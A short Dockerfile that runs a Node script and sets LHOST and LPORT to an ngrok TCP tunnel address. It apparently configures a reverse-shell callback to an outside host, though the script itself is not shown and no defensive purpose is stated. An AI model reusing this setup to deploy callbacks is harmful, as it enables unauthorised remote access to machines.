FROM node:20-alpine
WORKDIR /app
COPY app.js .
ENV LHOST=6.tcp.ngrok.io LPORT=19385
CMD ["node","/app/app.js"]
